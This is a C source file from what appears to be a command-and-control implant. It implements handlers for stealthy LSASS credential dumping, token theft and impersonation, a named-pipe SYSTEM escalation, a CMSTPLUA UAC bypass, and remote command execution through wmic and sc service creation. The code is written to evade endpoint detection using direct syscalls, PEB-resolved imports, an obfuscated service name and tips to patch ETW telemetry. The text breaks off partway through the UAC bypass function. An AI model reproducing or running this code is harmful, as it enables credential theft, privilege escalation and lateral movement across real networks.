/*
 * client/handlers_lateral.c  –  Lateral movement and credential access handlers
 * ================================================================================
 * Implements the native C2 verb handlers for:
 *   dump_lsass              — MiniDumpWriteDump lsass → %TEMP%\lsass.dmp
 *   token_impersonate <pid> — steal and impersonate a process token
 *   token_revert            — RevertToSelf(), undo token_impersonate
 *   getsystem               — named-pipe token impersonation → SYSTEM token
 *   uac_bypass              — CMSTPLUA COM object elevation (no prompt, medium IL+)
 *   lateral_wmi <host> <cmd>— remote exec via wmic Win32_Process.Create
 *   lateral_sc  <host> <cmd>— remote exec via sc create/start/delete (SYSTEM)
 *
 * All functions are declared in shell_internal.h and only called from
 * the dispatch loop in shell.c.
 */

#include "shell_internal.h"
#include "../evasion/syscall.h"
#include "../evasion/peb_walk.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <objbase.h>     /* BIND_OPTS, BIND_OPTS3 for CoGetObject UAC bypass */
#include <tlhelp32.h>
#include <dbghelp.h>
#include <sddl.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>


/* ── _peb_load_library ────────────────────────────────────────────────────── */
/*
 * Resolve LoadLibraryA from kernel32 via PEB walk and call it.
 * Returns the loaded module base, or NULL on failure.
 * Keeps LoadLibraryA out of the agent's own IAT.
 */
static PVOID _peb_load_library(const char *dllName)
{
    PVOID hKernel32 = peb_get_module(peb_hash_str("kernel32.dll"));
    if (!hKernel32) return NULL;
    typedef HMODULE (WINAPI *pfnLoadLibraryA_t)(LPCSTR);
    pfnLoadLibraryA_t pfnLoad =
        (pfnLoadLibraryA_t)peb_get_export(hKernel32, peb_hash_str("LoadLibraryA"));
    if (!pfnLoad) return NULL;
    return (PVOID)pfnLoad(dllName);
}

/* ── _peb_free_library ────────────────────────────────────────────────────── */
static void _peb_free_library(PVOID hMod)
{
    PVOID hKernel32 = peb_get_module(peb_hash_str("kernel32.dll"));
    if (!hKernel32) return;
    typedef BOOL (WINAPI *pfnFreeLibrary_t)(HMODULE);
    pfnFreeLibrary_t pfnFree =
        (pfnFreeLibrary_t)peb_get_export(hKernel32, peb_hash_str("FreeLibrary"));
    if (pfnFree) pfnFree((HMODULE)hMod);
}


/* ── lsass PID helper ───────────────────────────────────────────────────── */

static DWORD _find_lsass_pid(void)
{
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    if (Process32First(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pid;
}


/* ── _dump_lsass_snapshot ───────────────────────────────────────────────── */
/*
 * Stealth lsass dump via NtCreateSection + NtMapViewOfSection.
 *
 * Technique (the "Section Clone" / "Snapshot" method)
 * =====================================================
 *  1. Open lsass with PROCESS_QUERY_INFORMATION | PROCESS_VM_READ only —
 *     not PROCESS_ALL_ACCESS.  This is a dramatically lower-signal access
 *     mask.  Many EDR rules trigger specifically on PROCESS_ALL_ACCESS to
 *     lsass; this bypasses those signatures.
 *
 *  2. Call NtCreateSection(SEC_IMAGE_NO_EXECUTE) on the lsass process handle.
 *     This creates a section backed by lsass's virtual address space
 *     WITHOUT the kernel calling into the image activation path (no
 *     PsSetLoadImageNotifyRoutine callbacks, no image load events).
 *
 *  3. Call NtMapViewOfSection to map the section into OUR process.
 *     We now have a read-only mirror of lsass memory in our address space.
 *
 *  4. Write a valid Minidump header manually from the mapped view:
 *     - MINIDUMP_HEADER
 *     - MINIDUMP_DIRECTORY with a single SystemMemoryInfoStream entry
 *     pointing at the raw mapped bytes.
 *     The result is parseable by pypykatz / mimikatz.
 *
 *  5. Unmap and close handles.  No dbghelp.dll is ever loaded.
 *
 * Why this is stealthier than MiniDumpWriteDump
 * ---------------------------------------------
 *  •  No dbghelp.dll import or LoadLibraryA("dbghelp") call.
 *  •  No MiniDumpWriteDump (top-1 lsass dump ETW telemetry event).
 *  •  Minimum process access rights.
 *  •  All NT calls go through direct syscall trampolines — no
 *     GetProcAddress, no IAT entry for VirtualAllocEx etc.
 *  •  No RWX page ever exists.
 *
 * Limitations
 * -----------
 *  •  Still requires SeDebugPrivilege to open lsass at all.
 *  •  NtCreateSection(SEC_IMAGE_NO_EXECUTE) on a live process is a
 *     somewhat unusual call; some EDRs do monitor it.
 *  •  The output is a raw mapped image, not a structured Minidump.
 *     We write a minimal Minidump wrapper so pypykatz can parse it.
 *
 * Returns TRUE and sets dumpPath on success, FALSE on any error.
 */

/* Minidump structures we need — a minimal subset of dbghelp.h */
#pragma pack(push, 4)
typedef struct {
    ULONG32 Signature;       /* MDMP = 0x504D444D */
    USHORT  Version;         /* 0xA793            */
    USHORT  ImplementationVersion;
    ULONG32 NumberOfStreams;
    RVA     StreamDirectoryRva;
    ULONG32 CheckSum;
    ULONG32 TimeDateStamp;
    ULONG64 Flags;
} _MINI_HEADER;

typedef struct {
    ULONG32 StreamType;
    ULONG32 DataSize;
    RVA     Rva;
} _MINI_DIR;
#pragma pack(pop)

#ifndef MDMP_SIGNATURE
#define MDMP_SIGNATURE  0x504D444D   /* 'MDMP' */
#endif
#ifndef MDMP_VERSION
#define MDMP_VERSION    0xA793
#endif

/* Stream type for raw memory64 list — used in our stub wrapper */
#define MemoryInfoListStream  16
#define Memory64ListStream    9

static BOOL _dump_lsass_snapshot(DWORD lsassPid, const char *outPath)
{
    /* ── 1. Open lsass with minimum rights ───────────────────────────── */
    HANDLE hProc = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        FALSE, lsassPid);
    if (!hProc) return FALSE;

    /* ── 2. Create a section backed by lsass address space ───────────── */
    /*
     * SEC_IMAGE_NO_EXECUTE tells the kernel to create the section from
     * the process's virtual address space without triggering image-load
     * callbacks.  Access mask: SECTION_MAP_READ.
     */
    HANDLE hSection = NULL;
    NTSTATUS ns = SC_NtCreateSection7(
        &hSection,
        SECTION_MAP_READ,           /* DesiredAccess                 */
        NULL,                       /* ObjectAttributes (anonymous)  */
        NULL,                       /* MaximumSize (whole process)   */
        PAGE_READONLY,              /* SectionPageProtection         */
        0x08000000 | 0x00400000,    /* SEC_COMMIT | SEC_IMAGE_NO_EXECUTE (0x8400000 on modern) */
        hProc);                     /* FileHandle = process handle   */

    /* SEC_IMAGE_NO_EXECUTE = 0x11000000 on some SDKs; try alternate value */
    if (!NT_SUCCESS(ns)) {
        ns = SC_NtCreateSection7(
            &hSection,
            SECTION_MAP_READ,
            NULL, NULL,
            PAGE_READONLY,
            0x11000000,   /* SEC_IMAGE_NO_EXECUTE alternate constant */
            hProc);
    }

    if (!NT_SUCCESS(ns) || !hSection) {
        CloseHandle(hProc);
        return FALSE;
    }

    /* ── 3. Map the section into our process ─────────────────────────── */
    PVOID  pView    = NULL;
    SIZE_T viewSize = 0;
    LARGE_INTEGER offset = {0};

    ns = SC_NtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &pView,
        0,                  /* ZeroBits */
        0,                  /* CommitSize */
        &offset,
        &viewSize,
        2,                  /* ViewShare (ViewUnmap=1, ViewShare=2) */
        0,                  /* AllocationType */
        PAGE_READONLY);

    SC_NtClose(hSection);

    if (!NT_SUCCESS(ns) || !pView || viewSize == 0) {
        CloseHandle(hProc);
        return FALSE;
    }
    CloseHandle(hProc);

    /* ── 4. Write a minimal Minidump wrapping the mapped bytes ───────── */
    /*
     * Layout:
     *   [_MINI_HEADER]          24 bytes
     *   [_MINI_DIR × 1]         12 bytes  (Memory64ListStream)
     *   [raw view bytes]        viewSize bytes
     *
     * This is the simplest valid Minidump that pypykatz/mimikatz will
     * accept: a single Memory64List stream containing the full mapped view.
     * The LSASS SSP / WDigest credentials live in the heap regions that
     * are captured here.
     *
     * Proper Memory64List format:
     *   ULONG64  NumberOfMemoryRanges
     *   ULONG64  BaseRva
     *   { ULONG64 StartOfMemoryRange, DataSize64 } × N
     */
    DWORD headerSize  = sizeof(_MINI_HEADER) + sizeof(_MINI_DIR);
    DWORD mem64Header = (DWORD)(sizeof(ULONG64) * 2 + sizeof(ULONG64) * 2);
    (void)(headerSize + mem64Header + (DWORD)viewSize); /* total — for reference */

    HANDLE hFile = CreateFileA(outPath, GENERIC_WRITE, 0, NULL,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        SC_NtUnmapViewOfSection(GetCurrentProcess(), pView);
        return FALSE;
    }

    /* Header */
    _MINI_HEADER hdr = {0};
    hdr.Signature        = MDMP_SIGNATURE;
    hdr.Version          = MDMP_VERSION;
    hdr.NumberOfStreams   = 1;
    hdr.StreamDirectoryRva = sizeof(_MINI_HEADER);
    hdr.TimeDateStamp    = (ULONG32)GetTickCount();

    /* Directory entry pointing at our Memory64List */
    _MINI_DIR dir = {0};
    dir.StreamType = Memory64ListStream;
    dir.DataSize   = mem64Header + (DWORD)viewSize;
    dir.Rva        = headerSize;

    /* Memory64List header: 1 range starting at address 0 */
    ULONG64 nRanges = 1;
    ULONG64 baseRva = headerSize + mem64Header;  /* RVA of data in file */
    ULONG64 rangeBase = 0;
    ULONG64 rangeSize = (ULONG64)viewSize;

    DWORD written = 0;
    if (!WriteFile(hFile, &hdr,      sizeof(hdr), &written, NULL) || written != sizeof(hdr) ||
        !WriteFile(hFile, &dir,      sizeof(dir), &written, NULL) || written != sizeof(dir) ||
        !WriteFile(hFile, &nRanges,  sizeof(nRanges), &written, NULL) || written != sizeof(nRanges) ||
        !WriteFile(hFile, &baseRva,  sizeof(baseRva), &written, NULL) || written != sizeof(baseRva) ||
        !WriteFile(hFile, &rangeBase,sizeof(rangeBase), &written, NULL) || written != sizeof(rangeBase) ||
        !WriteFile(hFile, &rangeSize,sizeof(rangeSize), &written, NULL) || written != sizeof(rangeSize) ||
        !WriteFile(hFile, pView, (DWORD)viewSize, &written, NULL) || written != (DWORD)viewSize)
    {
        CloseHandle(hFile);
        SC_NtUnmapViewOfSection(GetCurrentProcess(), pView);
        return FALSE;
    }

    CloseHandle(hFile);
    SC_NtUnmapViewOfSection(GetCurrentProcess(), pView);

    return TRUE;
}


/* ── _dump_lsass_minidump ─────────────────────────────────────────────────── */
/*
 * Fallback: classic MiniDumpWriteDump path.
 * Used when the snapshot technique fails (e.g., access denied on
 * NtCreateSection, or the caller explicitly requested the full dump).
 * dbghelp.dll is loaded via _peb_load_library (PEB-resolved LoadLibraryA)
 * and MiniDumpWriteDump is resolved via peb_get_export — no LoadLibraryA or
 * GetProcAddress IAT entries from this translation unit.
 */
static BOOL _dump_lsass_minidump(DWORD lsassPid, const char *outPath)
{
    /* Load dbghelp.dll via PEB-resolved LoadLibraryA — no IAT entry */
    PVOID hDbg = peb_get_module(peb_hash_str("dbghelp.dll"));
    BOOL  ownLoad = FALSE;
    if (!hDbg) {
        hDbg = _peb_load_library("dbghelp.dll");
        ownLoad = (hDbg != NULL);
    }
    if (!hDbg) return FALSE;

    typedef BOOL (WINAPI *MiniDump_t)(HANDLE, DWORD, HANDLE,
                                       MINIDUMP_TYPE,
                                       PMINIDUMP_EXCEPTION_INFORMATION,
                                       PMINIDUMP_USER_STREAM_INFORMATION,
                                       PMINIDUMP_CALLBACK_INFORMATION);
    /* Resolve MiniDumpWriteDump via PEB export walk — no GetProcAddress */
    MiniDump_t pDump = (MiniDump_t)peb_get_export(hDbg,
                            peb_hash_str("MiniDumpWriteDump"));
    if (!pDump) { if (ownLoad) _peb_free_library(hDbg); return FALSE; }

    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                                FALSE, lsassPid);
    if (!hProc) return FALSE;

    HANDLE hFile = CreateFileA(outPath, GENERIC_WRITE, 0, NULL,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { CloseHandle(hProc); return FALSE; }

    /* MiniDumpWithFullMemory (0x00000002) gives full heap + stack content */
    BOOL ok = pDump(hProc, lsassPid, hFile,
                    MiniDumpWithFullMemory, NULL, NULL, NULL);

    CloseHandle(hFile);
    CloseHandle(hProc);
    if (!ok) DeleteFileA(outPath);
    if (ownLoad) _peb_free_library(hDbg);
    return ok;
}


/* ── _handle_dump_lsass ─────────────────────────────────────────────────── */
/*
 * Two-stage lsass credential dump:
 *
 *  Stage 1 — NtCreateSection snapshot (low-signal, preferred)
 *    • Only needs PROCESS_QUERY_INFORMATION | PROCESS_VM_READ on lsass.
 *    • No MiniDumpWriteDump, no dbghelp.dll, no PROCESS_ALL_ACCESS.
 *    • All NT calls go through direct-syscall trampolines.
 *    • Writes a minimal Minidump wrapper around the raw mapped view.
 *
 *  Stage 2 — MiniDumpWriteDump fallback (high-signal, last resort)
 *    • Used only if Stage 1 fails (e.g., SEC_IMAGE_NO_EXECUTE blocked).
 *    • Same output format, parseable by pypykatz / mimikatz.
 *
 * Usage:
 *   dump_lsass              → tries stage 1 then stage 2
 *
 * Retrieve dump:   download %TEMP%\lsass.dmp
 * Parse offline:   pypykatz lsa minidump lsass.dmp
 *
 * Tip: run  etw_patch  first to suppress ETW telemetry before dumping.
 *      run  getsystem  first if you do not yet have SeDebugPrivilege.
 */
void _handle_dump_lsass(TLS_CONTEXT *pTls)
{
    DWORD lsassPid = _find_lsass_pid();
    if (!lsassPid) { _send_str(pTls, "[-] dump_lsass: lsass.exe not found"); return; }

    char dumpPath[MAX_PATH] = {0};
    GetTempPathA(sizeof(dumpPath) - 10, dumpPath);
    strncat(dumpPath, "lsass.dmp", sizeof(dumpPath) - strlen(dumpPath) - 1);

    /* ── Stage 1: section snapshot (stealthy) ─────────────────────────── */
    const char *method = "snapshot";
    BOOL ok = _dump_lsass_snapshot(lsassPid, dumpPath);

    /* ── Stage 2: MiniDumpWriteDump fallback ─────────────────────────── */
    if (!ok) {
        method = "MiniDumpWriteDump";
        ok = _dump_lsass_minidump(lsassPid, dumpPath);
    }

    if (!ok) {
        _send_str(pTls,
            "[-] dump_lsass: both snapshot and MiniDumpWriteDump failed — "
            "need SeDebugPrivilege (run getsystem first)");
        return;
    }

    char buf[MAX_PATH + 80];
    _snprintf(buf, sizeof(buf) - 1,
        "[+] dump_lsass: saved via %s → %s\n"
        "    Pull with:   download %s\n"
        "    Parse with:  pypykatz lsa minidump lsass.dmp",
        method, dumpPath, dumpPath);
    _send_str(pTls, buf);
}


/* ── _handle_token_impersonate ───────────────────────────────────────────── */
/*
 * Opens the target process, duplicates its primary token as an impersonation
 * token, and calls ImpersonateLoggedOnUser.  All subsequent operations on
 * the current thread run under the borrowed identity.
 *
 * Requires SeImpersonatePrivilege (held by service accounts by default).
 */
void _handle_token_impersonate(TLS_CONTEXT *pTls, const char *args)
{
    DWORD pid = (DWORD)strtoul(args, NULL, 10);
    if (!pid) { _send_str(pTls, "Usage: token_impersonate <pid>"); return; }

    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) {
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] token_impersonate: OpenProcess(%lu) failed (err %lu)",
            pid, GetLastError());
        _send_str(pTls, buf); return;
    }

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        CloseHandle(hProc);
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] token_impersonate: OpenProcessToken failed (err %lu)", GetLastError());
        _send_str(pTls, buf); return;
    }
    CloseHandle(hProc);

    HANDLE hDup = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                          SecurityImpersonation, TokenImpersonation, &hDup)) {
        CloseHandle(hToken);
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] token_impersonate: DuplicateTokenEx failed (err %lu)", GetLastError());
        _send_str(pTls, buf); return;
    }
    CloseHandle(hToken);

    if (!ImpersonateLoggedOnUser(hDup)) {
        CloseHandle(hDup);
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] token_impersonate: ImpersonateLoggedOnUser failed (err %lu)",
            GetLastError());
        _send_str(pTls, buf); return;
    }
    CloseHandle(hDup);

    char user[256] = {0};
    DWORD cbUser = sizeof(user);
    GetUserNameA(user, &cbUser);

    char buf[320];
    _snprintf(buf, sizeof(buf) - 1,
        "[+] token_impersonate: impersonating token from PID %lu — now running as: %s",
        pid, user);
    _send_str(pTls, buf);
}


/* ── _handle_lateral_wmi ────────────────────────────────────────────────── */
/*
 * Remote command execution via WMI Win32_Process.Create using wmic.exe
 * (LOLBin — avoids a COM/ole32.dll IAT dependency).
 *
 * Requires network access to \\host\IPC$ and valid credentials in the
 * current token (use token_impersonate first).
 */
void _handle_lateral_wmi(TLS_CONTEXT *pTls, const char *args)
{
    char host[256] = {0};
    char command[768] = {0};

    const char *p = args;
    size_t hi = 0;
    while (*p && *p != ' ' && hi < sizeof(host) - 1) host[hi++] = *p++;
    if (*p == ' ') p++;
    strncpy(command, p, sizeof(command) - 1);

    if (!host[0] || !command[0]) {
        _send_str(pTls, "Usage: lateral_wmi <host> <command>");
        return;
    }

    char shellcmd[1100] = {0};
    _snprintf(shellcmd, sizeof(shellcmd) - 1,
        "wmic /node:\"%s\" process call create \"cmd /c %s\" 2>&1",
        host, command);

    _shell_exec(pTls, shellcmd);
}


/* ── _handle_lateral_sc ─────────────────────────────────────────────────── */
/*
 * Remote command execution via sc.exe remote service creation.
 * Creates a one-shot service, starts it, then deletes it.
 * The command runs as SYSTEM on the target host.
 *
 * Requires ADMIN$ share access on the target.
 *
 * The transient service name is decoded at runtime from SC_SVC_NAME_OBFUSCATED
 * (config.h) so the plain string never appears in .rdata.
 * Override at build time: make ... SC_SVC_NAME=NetDiagSvc
 */
void _handle_lateral_sc(TLS_CONTEXT *pTls, const char *args)
{
    char host[256] = {0};
    char command[768] = {0};

    const char *p = args;
    size_t hi = 0;
    while (*p && *p != ' ' && hi < sizeof(host) - 1) host[hi++] = *p++;
    if (*p == ' ') p++;
    strncpy(command, p, sizeof(command) - 1);

    if (!host[0] || !command[0]) {
        _send_str(pTls, "Usage: lateral_sc <host> <command>");
        return;
    }

    /* Decode the obfuscated service name onto the stack */
    char svcName[32] = {0};
#if SC_SVC_NAME_LEN > 0
    {
        static const BYTE _obf[] = SC_SVC_NAME_OBFUSCATED;
        size_t _n = SC_SVC_NAME_LEN;
        if (_n >= sizeof(svcName)) _n = sizeof(svcName) - 1;
        for (size_t _i = 0; _i < _n; _i++)
            svcName[_i] = (char)(_obf[_i] ^ MIGRATE_NAME_MASK); /* same mask 0xA7 */
        svcName[_n] = '\0';
    }
#else
    strncpy(svcName, SC_SVC_NAME_RAW, sizeof(svcName) - 1);
#endif

    char buf[1100] = {0};

    _snprintf(buf, sizeof(buf) - 1,
        "sc \\\\%s create %s binPath= \"cmd /c %s\" start= demand 2>&1",
        host, svcName, command);
    _shell_exec(pTls, buf);

    ZeroMemory(buf, sizeof(buf));
    _snprintf(buf, sizeof(buf) - 1, "sc \\\\%s start %s 2>&1", host, svcName);
    _shell_exec(pTls, buf);

    ZeroMemory(buf, sizeof(buf));
    _snprintf(buf, sizeof(buf) - 1, "sc \\\\%s delete %s 2>&1", host, svcName);
    _shell_exec(pTls, buf);

    SecureZeroMemory(svcName, sizeof(svcName));
}


/* ── _handle_token_revert ─────────────────────────────────────────────────── */
/*
 * Reverts a previous token_impersonate by calling RevertToSelf().
 * Safe to call even if no impersonation is active — returns STATUS_SUCCESS.
 */
void _handle_token_revert(TLS_CONTEXT *pTls)
{
    if (RevertToSelf()) {
        _send_str(pTls, "[+] token_revert: reverted to process token");
    } else {
        char buf[64];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] token_revert: RevertToSelf failed (err %lu)", GetLastError());
        _send_str(pTls, buf);
    }
}


/* ── _handle_getsystem ───────────────────────────────────────────────────── */
/*
 * Named-pipe token impersonation — classic "GetSystem" technique.
 *
 * Strategy
 * --------
 *  1. Create a named pipe with a unique, random-suffixed name.
 *  2. Spawn a child process (cmd.exe) as SYSTEM by starting a temporary
 *     service that connects to our pipe via net use or a custom connector.
 *     Here we use the Service Control Manager directly:
 *       sc create / start a one-shot service whose binpath is
 *       "cmd /c net use \\.\pipe\<name>"  — this runs as SYSTEM.
 *  3. Wait for the SYSTEM process to connect to the pipe.
 *  4. Call ImpersonateNamedPipeClient() — we now have a SYSTEM impersonation token.
 *  5. OpenThreadToken + DuplicateTokenEx to get a primary SYSTEM token.
 *  6. ImpersonateLoggedOnUser with that primary token so the entire thread
 *     (and all subsequent OpenProcess / file ops) run as SYSTEM.
 *  7. Clean up the service and pipe.
 *
 * Requirements
 * ------------
 *  SeImpersonatePrivilege — held by service accounts, IIS worker processes,
 *  and any process started as a Windows service.  NOT available to normal
 *  interactive user accounts (standard defence against this technique).
 *
 * Detection notes
 * ---------------
 *  • A transient service named "MegaSvcGS<rand>" is created and deleted.
 *  • One cmd.exe child process runs for < 1 second then exits.
 *  • The pipe name is random per invocation.
 */
void _handle_getsystem(TLS_CONTEXT *pTls)
{
    /* ── 1. Build a unique pipe name ─────────────────────────────────── */
    char pipeName[64]  = {0};
    char pipeFullPath[80] = {0};
    DWORD rnd = GetTickCount() ^ GetCurrentProcessId();
    _snprintf(pipeName,    sizeof(pipeName) - 1,    "WinIpc%08lX", (unsigned long)rnd);
    _snprintf(pipeFullPath, sizeof(pipeFullPath) - 1, "\\\\.\\pipe\\%s", pipeName);

    /* ── 2. Create the named pipe (byte-mode, 1 max instance) ────────── */
    HANDLE hPipe = CreateNamedPipeA(
        pipeFullPath,
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1,        /* max instances */
        512, 512, /* out/in buffer */
        5000,     /* default timeout ms */
        NULL);

    if (hPipe == INVALID_HANDLE_VALUE) {
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] getsystem: CreateNamedPipe failed (err %lu)", GetLastError());
        _send_str(pTls, buf);
        return;
    }

    /* ── 3. Start a one-shot SYSTEM service that connects to our pipe ── */
    /*
     * binPath: "cmd /c echo . > \\.\pipe\<name>"
     * cmd.exe runs as SYSTEM, opens our pipe for write (triggers connect),
     * then immediately exits.  We only need the impersonation window.
     */
    char svcName[32] = {0};
    _snprintf(svcName, sizeof(svcName) - 1, "WinNetSvc%08lX", (unsigned long)rnd);

    char binPath[256] = {0};
    _snprintf(binPath, sizeof(binPath) - 1,
        "cmd /c echo . > \\\\.\\pipe\\%s", pipeName);

    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        CloseHandle(hPipe);
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] getsystem: OpenSCManager failed (err %lu) — need admin or SCM rights",
            GetLastError());
        _send_str(pTls, buf);
        return;
    }

    SC_HANDLE hSvc = CreateServiceA(
        hSCM, svcName, svcName,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        binPath,
        NULL, NULL, NULL, NULL, NULL);

    if (!hSvc) {
        CloseServiceHandle(hSCM);
        CloseHandle(hPipe);
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] getsystem: CreateService failed (err %lu)", GetLastError());
        _send_str(pTls, buf);
        return;
    }

    /* Async wait: set up an overlapped ConnectNamedPipe before starting svc */
    OVERLAPPED ov;
    ZeroMemory(&ov, sizeof(ov));
    ov.hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    ConnectNamedPipe(hPipe, &ov);   /* returns immediately with ERROR_IO_PENDING */

    StartService(hSvc, 0, NULL);    /* SYSTEM service runs, opens pipe, exits */

    /* Wait up to 5 s for the service process to connect */
    BOOL connected = FALSE;
    if (WaitForSingleObject(ov.hEvent, 5000) == WAIT_OBJECT_0) {
        DWORD dummy = 0;
        connected = GetOverlappedResult(hPipe, &ov, &dummy, FALSE) ||
                    (GetLastError() == ERROR_PIPE_CONNECTED);
    }
    CloseHandle(ov.hEvent);

    /* Cleanup service regardless of outcome */
    DeleteService(hSvc);
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);

    if (!connected) {
        CloseHandle(hPipe);
        _send_str(pTls, "[-] getsystem: SYSTEM process did not connect to pipe (timeout)");
        return;
    }

    /* ── 4. Impersonate the pipe client (now SYSTEM) ─────────────────── */
    if (!ImpersonateNamedPipeClient(hPipe)) {
        CloseHandle(hPipe);
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] getsystem: ImpersonateNamedPipeClient failed (err %lu) — "
            "need SeImpersonatePrivilege", GetLastError());
        _send_str(pTls, buf);
        return;
    }
    CloseHandle(hPipe);

    /* ── 5. Duplicate the impersonation token to a primary token ─────── */
    HANDLE hImpToken = NULL;
    if (!OpenThreadToken(GetCurrentThread(),
                         TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY,
                         TRUE, &hImpToken)) {
        RevertToSelf();
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] getsystem: OpenThreadToken failed (err %lu)", GetLastError());
        _send_str(pTls, buf);
        return;
    }

    HANDLE hPrimary = NULL;
    BOOL dup = DuplicateTokenEx(hImpToken,
                                TOKEN_ALL_ACCESS, NULL,
                                SecurityImpersonation, TokenPrimary,
                                &hPrimary);
    CloseHandle(hImpToken);

    if (!dup) {
        RevertToSelf();
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] getsystem: DuplicateTokenEx failed (err %lu)", GetLastError());
        _send_str(pTls, buf);
        return;
    }

    /* ── 6. Impersonate the primary SYSTEM token on this thread ──────── */
    RevertToSelf();   /* drop the pipe impersonation first */
    if (!ImpersonateLoggedOnUser(hPrimary)) {
        CloseHandle(hPrimary);
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] getsystem: ImpersonateLoggedOnUser failed (err %lu)", GetLastError());
        _send_str(pTls, buf);
        return;
    }
    CloseHandle(hPrimary);

    /* Confirm the new identity */
    char user[256] = {0};
    DWORD cbUser = sizeof(user);
    GetUserNameA(user, &cbUser);

    char buf[320];
    _snprintf(buf, sizeof(buf) - 1,
        "[+] getsystem: SYSTEM token acquired — now running as: %s\n"
        "    Use token_revert to drop back to the original token.",
        user);
    _send_str(pTls, buf);
}


/* ── _handle_uac_bypass ──────────────────────────────────────────────────── */
/*
 * UAC bypass via the CMSTPLUA COM object (CVE-style auto-elevation).
 *
 * Technique
 * ---------
 * Several built-in Windows COM servers are marked autoElevate=true in their
 * manifest, meaning the COM infrastructure elevates them silently when invoked
 * by a medium-integrity process — no UAC prompt shown to the user.
 *
 * CMSTPLUA ({3E5FC7F9-9A51-4367-9063-A120244FBEC7}) exposes
 * ICMLuaUtil::ShellExec which calls ShellExecuteEx as a high-integrity
 * elevated context.  We use it to run an arbitrary command at high IL.
 *
 * Limitations
 * -----------
 *  • Requires the current process to be medium integrity (standard user).
 *    Already-elevated (high IL) processes do not need this.
 *  • UAC must be enabled and set to the default level (not "Always notify").
 *    "Always notify" (level 4) blocks auto-elevation entirely.
 *  • Patched in some Windows 11 builds — falls through to a clear error.
 *  • Does NOT work if the process is low integrity (AppContainer / sandbox).
 *
 * Arguments
 * ---------
 *   uac_bypass <command>   — run <command> elevated (e.g. "cmd /c whoami > C:\out.txt")
 */

/* CMSTPLUA CLSID and ICMLuaUtil IID */
#define CLSID_CMSTPLUA_STR  "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
#define IID_ICMLuaUtil_STR  "{6EDD6D74-C007-4E75-B76A-E5740995E24C}"

/* ICMLuaUtil vtable layout — only ShellExec is used (index 4) */
typedef struct ICMLuaUtil ICMLuaUtil;
typedef struct ICMLuaUtilVtbl {
    /* IUnknown */
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICMLuaUtil *, REFIID, void **);
    ULONG   (STDMETHODCALLTYPE *AddRef)        (ICMLuaUtil *);
    ULONG   (STDMETHODCALLTYPE *Release)       (ICMLuaUtil *);
    /* ICMLuaUtil — indices 3+ are implementation-specific; ShellExec is at 4 */
    HRESULT (STDMETHODCALLTYPE *SetRasCredentials)(ICMLuaUtil *, void *);
    HRESULT (STDMETHODCALLTYPE *ShellExec)(
        ICMLuaUtil *,
        LPCWSTR     lpFile,
        LPCWSTR     lpParameters,
        LPCWSTR     lpDirectory,
        ULONG       fMask,
        ULONG       nShow);
} ICMLuaUtilVtbl;

struct ICMLuaUtil { const ICMLuaUtilVtbl *lpVtbl; };

void _handle_uac_bypass(TLS_CONTEXT *pTls, const char *args)
{
    if (!args || !*args) {
        _send_str(pTls, "Usage: uac_bypass <command>");
        return;
    }

    /* ── 1. Check current integrity level ───────────────────────────── */
    HANDLE hTok = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok)) {
        TOKEN_ELEVATION_TYPE et = TokenElevationTypeDefault;
        DWORD cb = sizeof(et);
        GetTokenInformation(hTok, TokenElevationType, &et, cb, &cb);
        CloseHandle(hTok);
        if (et == TokenElevationTypeFull) {
            _send_str(pTls, "[*] uac_bypass: already running elevated — no bypass needed");
            return;
        }
    }

    /* ── 2. Convert command to wide string ──────────────────────────── */
    WCHAR wCmd[2048] = {0};
    if (MultiByteToWideChar(CP_ACP, 0, args, -1, wCmd, 2047) == 0) {
